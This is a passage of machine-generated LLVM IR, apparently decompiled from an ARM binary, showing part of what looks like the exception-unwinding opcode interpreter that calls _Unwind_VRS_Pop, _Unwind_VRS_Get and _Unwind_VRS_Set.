  store i1 %v7_196c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196c8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_196c4
  %v2_196cc = urem i32 %v0_19334, 4
  %v2_196d4 = add nuw nsw i32 %v2_196cc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_196e0 = or i32 %v2_196d4, 262144
  store i32 %v2_196e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195dc

bb157:                                            ; preds = %dec_label_pc_196c4
  %v2_196d0 = urem i32 %v0_19640, 8
  %v2_196d8 = add nuw nsw i32 %v2_196d0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_196e8 = or i32 %v2_196d8, 524288
  store i32 %v2_196e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_196f0:                               ; preds = %dec_label_pc_19600
  %v0_196f0 = load i32, i32* %ip.global-to-local, align 4
  %v7_196f0 = icmp eq i32 %v0_196f0, 198
  store i1 %v7_196f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196f0, label %dec_label_pc_196f8, label %dec_label_pc_194fc

dec_label_pc_196f8:                               ; preds = %dec_label_pc_196f0
  %v0_196f8 = load i32, i32* @r5, align 4
  %v1_196f8 = add i32 %v0_196f8, 8
  %v2_196f8 = inttoptr i32 %v1_196f8 to i8*
  %v3_196f8 = load i8, i8* %v2_196f8, align 1
  %v4_196f8 = zext i8 %v3_196f8 to i32
  store i32 %v4_196f8, i32* %r3.global-to-local, align 4
  %v2_196fc = icmp eq i8 %v3_196f8, 0
  store i1 %v2_196fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196fc, label %dec_label_pc_1970c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_196f8
  %v2_19700 = add nsw i32 %v4_196f8, -1
  store i32 %v2_19700, i32* %r3.global-to-local, align 4
  %v2_19704 = trunc i32 %v2_19700 to i8
  store i8 %v2_19704, i8* %v2_196f8, align 1
  %v0_19708.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19708.pr.pr, label %.thread48.dec_label_pc_1970c_crit_edge, label %dec_label_pc_19740

.thread48.dec_label_pc_1970c_crit_edge:           ; preds = %.thread48
  %v0_1970c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1970c

dec_label_pc_1970c:                               ; preds = %.thread48.dec_label_pc_1970c_crit_edge, %dec_label_pc_196f8
  %v2_19724 = phi i32 [ %v0_1970c.pre, %.thread48.dec_label_pc_1970c_crit_edge ], [ %v0_196f8, %dec_label_pc_196f8 ]
  %v1_1970c = add i32 %v2_19724, 9
  %v2_1970c = inttoptr i32 %v1_1970c to i8*
  %v3_1970c = load i8, i8* %v2_1970c, align 1
  %v4_1970c = zext i8 %v3_1970c to i32
  store i32 %v4_1970c, i32* %r3.global-to-local, align 4
  %v2_19710 = icmp eq i8 %v3_1970c, 0
  store i1 %v2_19710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19710, label %dec_label_pc_1975c, label %dec_label_pc_19720

dec_label_pc_19720:                               ; preds = %dec_label_pc_1970c
  %v1_19720 = add nsw i32 %v4_1970c, -1
  store i32 %v1_19720, i32* %r3.global-to-local, align 4
  %v1_19724 = trunc i32 %v1_19720 to i8
  store i8 %v1_19724, i8* %v2_1970c, align 1
  %v0_19728 = load i32, i32* @r5, align 4
  %v1_19728 = add i32 %v0_19728, 4
  %v2_19728 = inttoptr i32 %v1_19728 to i32*
  %v3_19728 = load i32, i32* %v2_19728, align 4
  store i32 %v3_19728, i32* %r2.global-to-local, align 4
  %v1_1972c = inttoptr i32 %v3_19728 to i32*
  %v2_1972c = load i32, i32* %v1_1972c, align 4
  store i32 %v2_1972c, i32* %r0.global-to-local, align 4
  %v4_1972c = add i32 %v3_19728, 4
  store i32 %v4_1972c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1972c, i32* %v2_19728, align 4
  %v0_19738 = load i32, i32* %r3.global-to-local, align 4
  %v1_19738 = trunc i32 %v0_19738 to i8
  %v2_19738 = load i32, i32* @r5, align 4
  %v3_19738 = add i32 %v2_19738, 8
  %v4_19738 = inttoptr i32 %v3_19738 to i8*
  store i8 %v1_19738, i8* %v4_19738, align 1
  %v0_1973c = load i32, i32* %r0.global-to-local, align 4
  %v1_1973c = load i32, i32* @r5, align 4
  %v2_1973c = inttoptr i32 %v1_1973c to i32*
  store i32 %v0_1973c, i32* %v2_1973c, align 4
  br label %dec_label_pc_19740

dec_label_pc_19740:                               ; preds = %.thread48, %dec_label_pc_19720
  %v0_19740 = load i32, i32* %r0.global-to-local, align 4
  %v3_19740 = udiv i32 %v0_19740, 16777216
  %v1_19744 = urem i32 %v3_19740, 16
  %v3_19748 = mul i32 %v0_19740, 256
  store i32 %v3_19748, i32* %r0.global-to-local, align 4
  %v1_1974c = add nuw nsw i32 %v1_19744, 1
  store i32 %v1_1974c, i32* %r2.global-to-local, align 4
  %v1_19750 = and i32 %v3_19740, 240
  store i32 %v1_19750, i32* %r3.global-to-local, align 4
  %v1_19754 = load i32, i32* @r5, align 4
  %v2_19754 = inttoptr i32 %v1_19754 to i32*
  store i32 %v3_19748, i32* %v2_19754, align 4
  %v0_19758 = load i32, i32* %r2.global-to-local, align 4
  %v1_19758 = load i32, i32* %r3.global-to-local, align 4
  %v4_19758 = mul i32 %v1_19758, 4096
  %v5_19758 = or i32 %v4_19758, %v0_19758
  br label %dec_label_pc_1975c

dec_label_pc_1975c:                               ; preds = %dec_label_pc_1970c, %dec_label_pc_19740
  %storemerge131 = phi i32 [ %v5_19758, %dec_label_pc_19740 ], [ 720897, %dec_label_pc_1970c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_19764:                               ; preds = %dec_label_pc_19520
  %v0_19764 = load i32, i32* @r5, align 4
  %v1_19764 = add i32 %v0_19764, 8
  %v2_19764 = inttoptr i32 %v1_19764 to i8*
  %v3_19764 = load i8, i8* %v2_19764, align 1
  %v4_19764 = zext i8 %v3_19764 to i32
  store i32 %v4_19764, i32* %r3.global-to-local, align 4
  %v2_19768 = icmp eq i8 %v3_19764, 0
  store i1 %v2_19768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19768, label %dec_label_pc_19778, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_19764
  %v2_1976c = add nsw i32 %v4_19764, -1
  store i32 %v2_1976c, i32* %r3.global-to-local, align 4
  %v2_19770 = trunc i32 %v2_1976c to i8
  store i8 %v2_19770, i8* %v2_19764, align 1
  %v0_19774.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19774.pr.pr, label %.thread52.dec_label_pc_19778_crit_edge, label %dec_label_pc_197ac

.thread52.dec_label_pc_19778_crit_edge:           ; preds = %.thread52
  %v0_19778.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19778

dec_label_pc_19778:                               ; preds = %.thread52.dec_label_pc_19778_crit_edge, %dec_label_pc_19764
  %v2_19790 = phi i32 [ %v0_19778.pre, %.thread52.dec_label_pc_19778_crit_edge ], [ %v0_19764, %dec_label_pc_19764 ]
  %v1_19778 = add i32 %v2_19790, 9
  %v2_19778 = inttoptr i32 %v1_19778 to i8*
  %v3_19778 = load i8, i8* %v2_19778, align 1
  %v4_19778 = zext i8 %v3_19778 to i32
  store i32 %v4_19778, i32* %r3.global-to-local, align 4
  %v2_1977c = icmp eq i8 %v3_19778, 0
  store i1 %v2_1977c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1977c, label %dec_label_pc_197c8, label %dec_label_pc_1978c

dec_label_pc_1978c:                               ; preds = %dec_label_pc_19778
  %v1_1978c = add nsw i32 %v4_19778, -1
  store i32 %v1_1978c, i32* %r3.global-to-local, align 4
  %v1_19790 = trunc i32 %v1_1978c to i8
  store i8 %v1_19790, i8* %v2_19778, align 1
  %v0_19794 = load i32, i32* @r5, align 4
  %v1_19794 = add i32 %v0_19794, 4
  %v2_19794 = inttoptr i32 %v1_19794 to i32*
  %v3_19794 = load i32, i32* %v2_19794, align 4
  store i32 %v3_19794, i32* %r2.global-to-local, align 4
  %v1_19798 = inttoptr i32 %v3_19794 to i32*
  %v2_19798 = load i32, i32* %v1_19798, align 4
  store i32 %v2_19798, i32* %r0.global-to-local, align 4
  %v4_19798 = add i32 %v3_19794, 4
  store i32 %v4_19798, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19798, i32* %v2_19794, align 4
  %v0_197a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_197a4 = trunc i32 %v0_197a4 to i8
  %v2_197a4 = load i32, i32* @r5, align 4
  %v3_197a4 = add i32 %v2_197a4, 8
  %v4_197a4 = inttoptr i32 %v3_197a4 to i8*
  store i8 %v1_197a4, i8* %v4_197a4, align 1
  %v0_197a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_197a8 = load i32, i32* @r5, align 4
  %v2_197a8 = inttoptr i32 %v1_197a8 to i32*
  store i32 %v0_197a8, i32* %v2_197a8, align 4
  br label %dec_label_pc_197ac

dec_label_pc_197ac:                               ; preds = %.thread52, %dec_label_pc_1978c
  %v0_197ac = load i32, i32* %r0.global-to-local, align 4
  %v3_197ac = udiv i32 %v0_197ac, 16777216
  %v1_197b0 = urem i32 %v3_197ac, 16
  %v3_197b4 = mul i32 %v0_197ac, 256
  store i32 %v3_197b4, i32* %r0.global-to-local, align 4
  %v1_197b8 = add nuw nsw i32 %v1_197b0, 1
  store i32 %v1_197b8, i32* %r2.global-to-local, align 4
  %v1_197bc = and i32 %v3_197ac, 240
  store i32 %v1_197bc, i32* %r3.global-to-local, align 4
  %v1_197c0 = load i32, i32* @r5, align 4
  %v2_197c0 = inttoptr i32 %v1_197c0 to i32*
  store i32 %v3_197b4, i32* %v2_197c0, align 4
  %v0_197c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_197c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_197c4 = mul i32 %v1_197c4, 4096
  %v5_197c4 = or i32 %v4_197c4, %v0_197c4
  br label %dec_label_pc_197c8

dec_label_pc_197c8:                               ; preds = %dec_label_pc_19778, %dec_label_pc_197ac
  %storemerge130 = phi i32 [ %v5_197c4, %dec_label_pc_197ac ], [ 720897, %dec_label_pc_19778 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_197d0:                               ; preds = %dec_label_pc_194fc
  %v0_197d0 = load i32, i32* @r5, align 4
  %v1_197d0 = add i32 %v0_197d0, 8
  %v2_197d0 = inttoptr i32 %v1_197d0 to i8*
  %v3_197d0 = load i8, i8* %v2_197d0, align 1
  %v4_197d0 = zext i8 %v3_197d0 to i32
  store i32 %v4_197d0, i32* %r3.global-to-local, align 4
  %v2_197d4 = icmp eq i8 %v3_197d0, 0
  store i1 %v2_197d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197d4, label %dec_label_pc_1997c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_197d0
  %v2_197d8 = add nsw i32 %v4_197d0, -1
  store i32 %v2_197d8, i32* %r3.global-to-local, align 4
  %v2_197dc = trunc i32 %v2_197d8 to i8
  store i8 %v2_197dc, i8* %v2_197d0, align 1
  %v0_197e0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_197e0.pr.pr, label %.thread56.dec_label_pc_1997c_crit_edge, label %dec_label_pc_197e4

.thread56.dec_label_pc_1997c_crit_edge:           ; preds = %.thread56
  %v0_1997c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1997c

dec_label_pc_197e4:                               ; preds = %.thread56, %dec_label_pc_19988
  %v0_197e4 = load i32, i32* %r0.global-to-local, align 4
  %v3_197e4 = udiv i32 %v0_197e4, 16777216
  store i32 %v3_197e4, i32* %r3.global-to-local, align 4
  store i32 %v3_197e4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_197e4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_197ec = mul i32 %v0_197e4, 256
  store i32 %v3_197ec, i32* %r0.global-to-local, align 4
  %v1_197f0 = load i32, i32* @r5, align 4
  %v2_197f0 = inttoptr i32 %v1_197f0 to i32*
  store i32 %v3_197ec, i32* %v2_197f0, align 4
  br i1 %tmp184, label %dec_label_pc_195ac, label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197e4
  %v0_197f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_197f8 = and i32 %v0_197f8, 240
  store i32 %v1_197f8, i32* %r3.global-to-local, align 4
  %v2_197f8 = icmp eq i32 %v1_197f8, 0
  store i1 %v2_197f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197f8, label %dec_label_pc_19800, label %dec_label_pc_195ac

dec_label_pc_19800:                               ; preds = %dec_label_pc_197f8
  %v0_19800 = load i32, i32* @r7, align 4
  store i32 %v0_19800, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19808 = load i32, i32* %r2.global-to-local, align 4
  %v4_19808 = call i32 @_Unwind_VRS_Pop(i32 %v0_19800, i32 4, i32 %v2_19808, i32 0)
  store i32 %v4_19808, i32* %r0.global-to-local, align 4
  %v2_1980c = icmp eq i32 %v4_19808, 0
  store i1 %v2_1980c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1980c, label %dec_label_pc_192dc.backedge, label %dec_label_pc_19814

dec_label_pc_19814:                               ; preds = %dec_label_pc_19800
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19404

dec_label_pc_1981c:                               ; preds = %dec_label_pc_19648
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19828 = load i32, i32* @r7, align 4
  store i32 %v0_19828, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19834 = call i32 @_Unwind_VRS_Get(i32 %v0_19828, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19834, i32* %r0.global-to-local, align 4
  %v0_19838 = load i32, i32* @r5, align 4
  %v1_19838 = add i32 %v0_19838, 8
  %v2_19838 = inttoptr i32 %v1_19838 to i8*
  %v3_19838 = load i8, i8* %v2_19838, align 1
  %v4_19838 = zext i8 %v3_19838 to i32
  store i32 %v4_19838, i32* %r1.global-to-local, align 4
  %v2_1983c = icmp eq i8 %v3_19838, 0
  store i1 %v2_1983c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1983c, label %dec_label_pc_1984c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1981c
  %v2_19840 = add nsw i32 %v4_19838, -1
  store i32 %v2_19840, i32* %r3.global-to-local, align 4
  %v2_19844 = trunc i32 %v2_19840 to i8
  store i8 %v2_19844, i8* %v2_19838, align 1
  %v0_19848.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19848.pr.pr, label %.thread58.dec_label_pc_1984c_crit_edge, label %dec_label_pc_19878

.thread58.dec_label_pc_1984c_crit_edge:           ; preds = %.thread58
  %v0_1984c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1984c

dec_label_pc_1984c:                               ; preds = %.thread58.dec_label_pc_1984c_crit_edge, %dec_label_pc_1981c
  %v2_19860 = phi i32 [ %v0_1984c.pre, %.thread58.dec_label_pc_1984c_crit_edge ], [ %v0_19838, %dec_label_pc_1981c ]
  %v1_1984c = add i32 %v2_19860, 9
  %v2_1984c = inttoptr i32 %v1_1984c to i8*
  %v3_1984c = load i8, i8* %v2_1984c, align 1
  %v4_1984c = zext i8 %v3_1984c to i32
  store i32 %v4_1984c, i32* %r3.global-to-local, align 4
  %v2_19850 = icmp eq i8 %v3_1984c, 0
  store i1 %v2_19850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19850, label %bb158, label %dec_label_pc_1985c

bb158:                                            ; preds = %dec_label_pc_1984c
  %v1_19854 = load i32, i32* @r6, align 4
  store i32 %v1_19854, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_198a0

dec_label_pc_1985c:                               ; preds = %dec_label_pc_1984c
  %v1_1985c = add nsw i32 %v4_1984c, -1
  store i32 %v1_1985c, i32* %r3.global-to-local, align 4
  %v1_19860 = trunc i32 %v1_1985c to i8
  store i8 %v1_19860, i8* %v2_1984c, align 1
  %v0_19864 = load i32, i32* @r5, align 4
  %v1_19864 = add i32 %v0_19864, 4
  %v2_19864 = inttoptr i32 %v1_19864 to i32*
  %v3_19864 = load i32, i32* %v2_19864, align 4
  store i32 %v3_19864, i32* %r2.global-to-local, align 4
  %v1_19868 = inttoptr i32 %v3_19864 to i32*
  %v2_19868 = load i32, i32* %v1_19868, align 4
  store i32 %v2_19868, i32* %r0.global-to-local, align 4
  %v4_19868 = add i32 %v3_19864, 4
  store i32 %v4_19868, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19870 = inttoptr i32 %v0_19864 to i32*
  store i32 %v2_19868, i32* %v1_19870, align 4
  %v5_19870 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19870, i32* %v2_19864, align 4
  %v0_19874 = load i32, i32* %r3.global-to-local, align 4
  %v1_19874 = trunc i32 %v0_19874 to i8
  %v2_19874 = load i32, i32* @r5, align 4
  %v3_19874 = add i32 %v2_19874, 8
  %v4_19874 = inttoptr i32 %v3_19874 to i8*
  store i8 %v1_19874, i8* %v4_19874, align 1
  br label %dec_label_pc_19878

dec_label_pc_19878:                               ; preds = %.thread58, %dec_label_pc_1985c
  %v0_19878 = load i32, i32* @r5, align 4
  %v1_19878 = inttoptr i32 %v0_19878 to i32*
  %v2_19878 = load i32, i32* %v1_19878, align 4
  store i32 %v2_19878, i32* %r3.global-to-local, align 4
  %v3_1987c = mul i32 %v2_19878, 256
  store i32 %v3_1987c, i32* %r0.global-to-local, align 4
  %v3_19880 = udiv i32 %v2_19878, 16777216
  store i32 %v3_19880, i32* %r2.global-to-local, align 4
  store i32 %v3_1987c, i32* %v1_19878, align 4
  %v0_19888 = load i32, i32* %r2.global-to-local, align 4
  %v1_19888 = and i32 %v0_19888, 128
  %v2_19888 = icmp eq i32 %v1_19888, 0
  store i1 %v2_19888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19888, label %.thread129, label %dec_label_pc_1989c

.thread129:                                       ; preds = %dec_label_pc_19878
  %v4_1988c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1988c, i32* %ip.global-to-local, align 4
  %v1_19890 = urem i32 %v0_19888, 256
  store i32 %v1_19890, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19910

dec_label_pc_1989c:                               ; preds = %dec_label_pc_19878
  %v1_1989063 = urem i32 %v0_19888, 256
  store i32 %v1_1989063, i32* %r2.global-to-local, align 4
  %v0_1989c = load i32, i32* @r5, align 4
  %v1_1989c = add i32 %v0_1989c, 8
  %v2_1989c = inttoptr i32 %v1_1989c to i8*
  %v3_1989c = load i8, i8* %v2_1989c, align 1
  %v4_1989c = zext i8 %v3_1989c to i32
  store i32 %v4_1989c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198a0

dec_label_pc_198a0:                               ; preds = %bb158, %dec_label_pc_1989c
  %v3_198c099 = phi i32 [ %v2_19860, %bb158 ], [ %v0_1989c, %dec_label_pc_1989c ]
  %v0_198a892 = phi i32 [ %v1_19854, %bb158 ], [ %v1_1989063, %dec_label_pc_1989c ]
  %v3_198a0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_198a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_198a8

dec_label_pc_198a8:                               ; preds = %dec_label_pc_198a8.backedge, %dec_label_pc_198a0
  %v3_198c0 = phi i32 [ %v3_198c0100, %dec_label_pc_198a8.backedge ], [ %v3_198c099, %dec_label_pc_198a0 ]
  %v0_198bc = phi i32 [ %v2_198ac.pre, %dec_label_pc_198a8.backedge ], [ 2, %dec_label_pc_198a0 ]
  %v0_198ac = phi i32 [ %v0_198ac.pre, %dec_label_pc_198a8.backedge ], [ %v3_198a0, %dec_label_pc_198a0 ]
  %v0_198a8 = phi i32 [ %v0_198a895, %dec_label_pc_198a8.backedge ], [ %v0_198a892, %dec_label_pc_198a0 ]
  %v1_198a8 = urem i32 %v0_198a8, 128
  %v7_198ac = shl i32 %v1_198a8, %v0_198bc
  %v8_198ac = add i32 %v7_198ac, %v0_198ac
  store i32 %v8_198ac, i32* %ip.global-to-local, align 4
  %v0_198b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_198b0 = icmp eq i32 %v0_198b0, 0
  store i1 %v2_198b0, i1* %cpsr_z.global-to-local, align 1
  %v1_198b4 = add i32 %v0_198b0, -1
  store i32 %v1_198b4, i32* %r3.global-to-local, align 4
  store i32 %v8_198ac, i32* %stack_var_-36, align 4
  %v1_198bc = add i32 %v0_198bc, 7
  store i32 %v1_198bc, i32* @lr, align 4
  br i1 %v2_198b0, label %dec_label_pc_198c8, label %bb159

bb159:                                            ; preds = %dec_label_pc_198a8
  %v2_198c0 = trunc i32 %v1_198b4 to i8
  %v4_198c0 = add i32 %v3_198c0, 8
  %v5_198c0 = inttoptr i32 %v4_198c0 to i8*
  store i8 %v2_198c0, i8* %v5_198c0, align 1
  %v0_198c4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198c4.pr, label %.dec_label_pc_198c8_crit_edge, label %dec_label_pc_198f4

.dec_label_pc_198c8_crit_edge:                    ; preds = %bb159
  %v0_198c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_198c8

dec_label_pc_198c8:                               ; preds = %.dec_label_pc_198c8_crit_edge, %dec_label_pc_198a8
  %v2_198e0 = phi i32 [ %v0_198c8.pre, %.dec_label_pc_198c8_crit_edge ], [ %v3_198c0, %dec_label_pc_198a8 ]
  %v1_198c8 = add i32 %v2_198e0, 9
  %v2_198c8 = inttoptr i32 %v1_198c8 to i8*
  %v3_198c8 = load i8, i8* %v2_198c8, align 1
  %v4_198c8 = zext i8 %v3_198c8 to i32
  store i32 %v4_198c8, i32* %r3.global-to-local, align 4
  %v2_198cc = icmp eq i8 %v3_198c8, 0
  store i1 %v2_198cc, i1* %cpsr_z.global-to-local, align 1
  %v1_198d0 = add nsw i32 %v4_198c8, -1
  store i32 %v1_198d0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_198cc, label %dec_label_pc_198a8.backedge, label %dec_label_pc_198dc

dec_label_pc_198dc:                               ; preds = %dec_label_pc_198c8
  %v1_198dc = add i32 %v2_198e0, 4
  %v2_198dc = inttoptr i32 %v1_198dc to i32*
  %v3_198dc = load i32, i32* %v2_198dc, align 4
  store i32 %v3_198dc, i32* %r2.global-to-local, align 4
  %v1_198e0 = trunc i32 %v1_198d0 to i8
  store i8 %v1_198e0, i8* %v2_198c8, align 1
  %v0_198e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_198e4 = inttoptr i32 %v0_198e4 to i32*
  %v2_198e4 = load i32, i32* %v1_198e4, align 4
  store i32 %v2_198e4, i32* %r0.global-to-local, align 4
  %v4_198e4 = add i32 %v0_198e4, 4
  store i32 %v4_198e4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_198ec = load i32, i32* @r5, align 4
  %v3_198ec = add i32 %v2_198ec, 8
  %v4_198ec = inttoptr i32 %v3_198ec to i8*
  store i8 3, i8* %v4_198ec, align 1
  %v0_198f0 = load i32, i32* @r5, align 4
  %v1_198f0 = inttoptr i32 %v0_198f0 to i32*
  %v2_198f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_198f0, i32* %v1_198f0, align 4
  %v3_198f0 = add i32 %v0_198f0, 4
  %v4_198f0 = inttoptr i32 %v3_198f0 to i32*
  %v5_198f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_198f0, i32* %v4_198f0, align 4
  br label %dec_label_pc_198f4

dec_label_pc_198f4:                               ; preds = %bb159, %dec_label_pc_198dc
  %v0_198f4 = load i32, i32* @r5, align 4
  %v1_198f4 = inttoptr i32 %v0_198f4 to i32*
  %v2_198f4 = load i32, i32* %v1_198f4, align 4
  store i32 %v2_198f4, i32* %r3.global-to-local, align 4
  %v3_198f8 = udiv i32 %v2_198f4, 16777216
  store i32 %v3_198f8, i32* %r2.global-to-local, align 4
  %v1_198fc = and i32 %v3_198f8, 128
  %v2_198fc = icmp eq i32 %v1_198fc, 0
  store i1 %v2_198fc, i1* %cpsr_z.global-to-local, align 1
  %v3_19900 = mul i32 %v2_198f4, 256
  store i32 %v3_19900, i32* %r0.global-to-local, align 4
  store i32 %v3_19900, i32* %v1_198f4, align 4
  %v0_19908 = load i32, i32* %r2.global-to-local, align 4
  %v1_19908 = urem i32 %v0_19908, 256
  store i32 %v1_19908, i32* %r2.global-to-local, align 4
  br i1 %v2_198fc, label %dec_label_pc_19910.loopexit, label %dec_label_pc_1993c

dec_label_pc_19910.loopexit:                      ; preds = %dec_label_pc_198f4
  %v0_19914.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19918.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19910

dec_label_pc_19910:                               ; preds = %dec_label_pc_19910.loopexit, %.thread129
  %v2_19918 = phi i32 [ 2, %.thread129 ], [ %v2_19918.pre, %dec_label_pc_19910.loopexit ]
  %v0_19914 = phi i32 [ %v4_1988c, %.thread129 ], [ %v0_19914.pre, %dec_label_pc_19910.loopexit ]
  %v0_19910 = phi i32 [ %v1_19890, %.thread129 ], [ %v1_19908, %dec_label_pc_19910.loopexit ]
  %v1_19910 = urem i32 %v0_19910, 128
  %v1_19914 = add i32 %v0_19914, 516
  %v7_19918 = shl i32 %v1_19910, %v2_19918
  %v8_19918 = add i32 %v1_19914, %v7_19918
  store i32 %v8_19918, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19920 = load i32, i32* @r7, align 4
  store i32 %v0_19920, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19918, i32* %stack_var_-36, align 4
  %v5_19934 = call i32 @_Unwind_VRS_Set(i32 %v0_19920, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19934, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192dc.backedge

dec_label_pc_1993c:                               ; preds = %dec_label_pc_198f4
  %v0_1993c = load i32, i32* @r5, align 4
  %v1_1993c = add i32 %v0_1993c, 8
  %v2_1993c = inttoptr i32 %v1_1993c to i8*
  %v3_1993c = load i8, i8* %v2_1993c, align 1
  %v4_1993c = zext i8 %v3_1993c to i32
  store i32 %v4_1993c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198a8.backedge

dec_label_pc_198a8.backedge:                      ; preds = %dec_label_pc_1993c, %dec_label_pc_198c8
  %v3_198c0100 = phi i32 [ %v0_1993c, %dec_label_pc_1993c ], [ %v2_198e0, %dec_label_pc_198c8 ]
  %v0_198a895 = phi i32 [ %v1_19908, %dec_label_pc_1993c ], [ 176, %dec_label_pc_198c8 ]
  %v0_198ac.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_198ac.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_198a8

dec_label_pc_19944:                               ; preds = %dec_label_pc_19640
  %v0_19944 = load i32, i32* @r5, align 4
  %v1_19944 = add i32 %v0_19944, 8
  %v2_19944 = inttoptr i32 %v1_19944 to i8*
  %v3_19944 = load i8, i8* %v2_19944, align 1
  %v4_19944 = zext i8 %v3_19944 to i32
  store i32 %v4_19944, i32* %r3.global-to-local, align 4
  %v2_19948 = icmp eq i8 %v3_19944, 0
  store i1 %v2_19948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19948, label %dec_label_pc_199ac, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_19944
  %v2_1994c = add nsw i32 %v4_19944, -1
  store i32 %v2_1994c, i32* %r3.global-to-local, align 4
  %v2_19950 = trunc i32 %v2_1994c to i8
  store i8 %v2_19950, i8* %v2_19944, align 1
  %v0_19954.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19954.pr.pr, label %.thread66.dec_label_pc_199ac_crit_edge, label %dec_label_pc_19958

.thread66.dec_label_pc_199ac_crit_edge:           ; preds = %.thread66
  %v0_199ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199ac

dec_label_pc_19958:                               ; preds = %.thread66, %dec_label_pc_199b8
  %v0_19958 = load i32, i32* %r0.global-to-local, align 4
  %v3_19958 = udiv i32 %v0_19958, 16777216
  store i32 %v3_19958, i32* %r3.global-to-local, align 4
  store i32 %v3_19958, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_19958, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_19960 = mul i32 %v0_19958, 256
  store i32 %v3_19960, i32* %r0.global-to-local, align 4
  %v1_19964 = load i32, i32* @r5, align 4
  %v2_19964 = inttoptr i32 %v1_19964 to i32*
  store i32 %v3_19960, i32* %v2_19964, align 4
  br i1 %tmp185, label %dec_label_pc_195ac, label %dec_label_pc_1996c

dec_label_pc_1996c:                               ; preds = %dec_label_pc_19958
  %v0_1996c = load i32, i32* %r3.global-to-local, align 4
